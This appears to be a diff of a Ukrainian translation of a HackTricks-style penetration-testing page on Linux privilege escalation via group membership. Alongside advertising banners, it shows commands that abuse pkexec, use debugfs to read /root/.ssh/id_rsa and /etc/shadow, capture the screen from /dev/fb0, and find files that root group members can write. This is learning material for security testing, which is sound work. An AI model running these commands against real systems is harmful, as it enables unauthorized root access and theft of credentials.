@@ -13,6 +13,12 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
+<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+Get Access Today:
+
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 # Sudo/Admin Groups
 
@@ -38,8 +44,7 @@ sudo su
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-Якщо ви виявите, що двійковий файл pkexec є SUID двійковим файлом і ви належите до sudo або admin, ви, ймовірно, зможете виконувати двійкові файли як sudo, використовуючи pkexec.  
-Перевірте вміст:
+Якщо ви виявите, що двійковий файл pkexec є SUID-двоїстим файлом і ви належите до sudo або admin, ви, ймовірно, зможете виконувати двійкові файли як sudo, використовуючи pkexec. Перевірте вміст:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
@@ -55,7 +60,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**Це не тому, що у вас немає дозволів, а тому, що ви не підключені без GUI**. І є обхідний шлях для цієї проблеми тут: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Вам потрібно **2 різні ssh сесії**:
+**Це не тому, що у вас немає дозволів, а тому, що ви не підключені без GUI**. І є обхід цього питання тут: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Вам потрібно **2 різні ssh сесії**:
 
 {% code title="session1" %}
 ```bash
@@ -104,7 +109,7 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-Зверніть увагу, що за допомогою debugfs ви також можете **записувати файли**. Наприклад, щоб скопіювати `/tmp/asd1.txt` до `/tmp/asd2.txt`, ви можете зробити:
+Зверніть увагу, що використовуючи debugfs, ви також можете **записувати файли**. Наприклад, щоб скопіювати `/tmp/asd1.txt` до `/tmp/asd2.txt`, ви можете зробити:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
@@ -121,7 +126,7 @@ moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 **tty1** означає, що користувач **yossi фізично увійшов** до терміналу на машині.
 
-Група **video** має доступ до перегляду виходу екрану. В основному, ви можете спостерігати за екранами. Щоб це зробити, вам потрібно **захопити поточне зображення на екрані** в сирих даних і отримати роздільну здатність, яку використовує екран. Дані екрану можна зберегти в `/dev/fb0`, а роздільну здатність цього екрану можна знайти в `/sys/class/graphics/fb0/virtual_size`
+**Група video** має доступ до перегляду виходу екрану. В основному, ви можете спостерігати за екранами. Щоб це зробити, вам потрібно **захопити поточне зображення на екрані** в сирих даних і отримати роздільну здатність, яку використовує екран. Дані екрану можна зберегти в `/dev/fb0`, а роздільну здатність цього екрану можна знайти в `/sys/class/graphics/fb0/virtual_size`
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
@@ -136,9 +141,9 @@ cat /sys/class/graphics/fb0/virtual_size
 
 # Група Root
 
-Схоже, що за замовчуванням **члени групи root** можуть мати доступ до **модифікації** деяких **конфігураційних файлів** сервісів або деяких файлів **бібліотек** або **інших цікавих речей**, які можуть бути використані для ескалації привілеїв...
+Схоже, що за замовчуванням **учасники групи root** можуть мати доступ до **модифікації** деяких **конфігураційних файлів сервісів** або деяких **файлів бібліотек** або **інших цікавих речей**, які можуть бути використані для ескалації привілеїв...
 
-**Перевірте, які файли можуть модифікувати члени root**:
+**Перевірте, які файли можуть модифікувати учасники root**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
@@ -153,6 +158,14 @@ find / -group root -perm -g=w 2>/dev/null
 # lxc/lxd Group
 
 [lxc - Підвищення привілеїв](lxd-privilege-escalation.md)
+
+
+<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+Використовуйте [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) для легкого створення та **автоматизації робочих процесів**, підтримуваних **найсучаснішими** інструментами спільноти.\
+Отримайте доступ сьогодні:
+
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {% hint style="success" %}
 Вчіться та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
